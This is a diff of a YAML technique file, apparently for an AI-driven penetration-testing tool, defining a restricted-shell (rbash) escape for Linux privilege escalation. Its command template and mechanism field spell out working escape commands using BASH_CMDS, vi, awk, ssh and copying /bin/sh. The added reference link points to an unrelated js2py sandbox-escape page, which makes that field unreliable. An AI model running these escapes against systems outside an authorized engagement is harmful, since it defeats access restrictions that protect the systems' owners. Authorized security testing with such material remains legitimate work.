@@ -2,15 +2,20 @@ name: rbash_escape
 category: privesc
 description: Restricted shell (rbash) escape
 preconditions:
-  - os==linux
+- os==linux
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "BASH_CMDS[a]=/bin/sh;a"
-parser: null
+command_template: BASH_CMDS[a]=/bin/sh;a
+parser: generic_parser
 expected_effects:
-  - action_completed
+- shell_escaped
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Escape rbash: vi/vim (:!/bin/sh), awk/nawk (awk 'BEGIN{system("/bin/sh")}'), python/perl/ruby one-liners, ssh -t 'bash --noprofile', cp /bin/sh to allowed path."
+mechanism: 'Escape rbash: vi/vim (:!/bin/sh), awk/nawk (awk ''BEGIN{system("/bin/sh")}''),
+  python/perl/ruby one-liners, ssh -t ''bash --noprofile'', cp /bin/sh to allowed
+  path.
+
+  '
+hacktricks_ref: generic-methodologies-and-resources/python/bypass-python-sandboxes/js2py-sandbox-escape-cve-2024-28397.md
